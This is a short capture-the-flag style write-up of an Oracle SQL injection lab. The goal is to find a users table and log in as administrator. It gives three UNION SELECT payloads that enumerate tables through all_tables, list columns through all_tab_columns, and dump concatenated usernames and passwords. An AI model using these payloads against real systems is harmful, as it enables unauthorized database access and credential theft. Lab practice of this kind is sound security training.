### Ten Exercise 👆


![problem.PNG](/assets/SQLi/Ten/problem.PNG)


#### **To do**

```
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.  
```

#### Remember, this database is Oracle
1. List all tables
```sql
' union select NULL,table_name from all_tables-- -
```

**Output**

![tables.PNG](/assets/SQLi/Ten/tables.PNG)


2. Search table **User** and list this columns
```sql
' union select NULL, column_name from all_tab_columns where table_name='USERS_ATFDQF'-- -
```

![columns.PNG](/assets/SQLi/Ten/columns.PNG)


3. List content of table **Users**
```sql
' union select NULL, PASSWORD_HTUZCJ || USERNAME_LSBNON from USERS_ATFDQF
```

**Output**

![cred.PNG](/assets/SQLi/Ten/creds.PNG)


4. Login how **administrator**